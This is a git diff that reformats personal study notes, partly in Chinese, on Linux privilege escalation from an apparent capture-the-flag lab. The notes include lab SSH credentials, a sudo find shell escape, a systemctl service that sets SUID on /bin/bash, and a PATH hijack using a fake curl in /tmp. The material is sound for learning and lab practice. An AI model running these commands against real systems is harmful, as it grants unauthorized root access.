@@ -1,7 +1,5 @@
-Privilege Escalation
-
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Linux Privilege Escalation : 
+# Privilege Escalation
+## Linux Privilege Escalation : 
 	--> 權限較低的帳戶到權限較高的帳戶
 	--> ssh karen@10.10.163.255 Password1
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
@@ -134,8 +132,7 @@ Linux Privilege Escalation :
 			--> wget "https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh" -O lse.sh;chmod 700 lse.sh
 			--> ./lse.sh help | bash lse.sh 
 			
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~			
-Privilege Escalation:
+## Privilege Escalation:
 	--> Kernel Exploits :
 		--> 內核利用方法
 			--> 識別核心版本 => uname -a
@@ -455,35 +452,34 @@ Privilege Escalation:
 			--> https://gtfobins.github.io
 			--> sudo find . -exec /bin/sh \; -quit
 			--> find / -name flag2.txt 2>/dev/null	
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-other root : 
-	--> SUID 
-		--> GTFOBins => systemctl
-			=> 將“id > /tmp/output”更改為“sh -p”或“chmod +s /bin/bash”
-				TF=$(mktemp).service
-				echo '[Service]
-				Type=oneshot
-				ExecStart=/bin/sh -c "chmod +s /bin/bash"
-				[Install]
-				WantedBy=multi-user.target' > $TF
-				systemctl link $TF
-				systemctl enable --now $TF
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~		
-	--> PATH  :
-		--> find / -perm -u=s -type f 2>/dev/null
-			=> /usr/bin/menu
-		--> 運行二進位文件
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+		--> SUID 
+			--> GTFOBins => systemctl
+				=> 將“id > /tmp/output”更改為“sh -p”或“chmod +s /bin/bash”
+					TF=$(mktemp).service
+					echo '[Service]
+					Type=oneshot
+					ExecStart=/bin/sh -c "chmod +s /bin/bash"
+					[Install]
+					WantedBy=multi-user.target' > $TF
+					systemctl link $TF
+					systemctl enable --now $TF
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~		
+		--> PATH  :
+			--> find / -perm -u=s -type f 2>/dev/null
+				=> /usr/bin/menu
+			--> 運行二進位文件
+				--> /usr/bin/menu
+			--> Strings : 用於在二進位檔案中尋找人類可讀的字串
+				--> Strings /usr/bin/menu	
+					=> found that curl use 	不完整路徑
+						=> curl -I localhost
+		不指定完整路徑
+			--> 系統將查看 PATH 變數並在路徑中指定的所有位置中搜尋所需檔案
+			--> export PATH=/tmp:$PATH
+			
+			--> cd /tmp
+			--> echo /bin/sh > curl
+			--> chmod 777 curl
+			--> export PATH=/tmp:$PATH
 			--> /usr/bin/menu
-		--> Strings : 用於在二進位檔案中尋找人類可讀的字串
-			--> Strings /usr/bin/menu	
-				=> found that curl use 	不完整路徑
-					=> curl -I localhost
-	不指定完整路徑
-		--> 系統將查看 PATH 變數並在路徑中指定的所有位置中搜尋所需檔案
-		--> export PATH=/tmp:$PATH
-		
-		--> cd /tmp
-		--> echo /bin/sh > curl
-		--> chmod 777 curl
-		--> export PATH=/tmp:$PATH
-		--> /usr/bin/menu
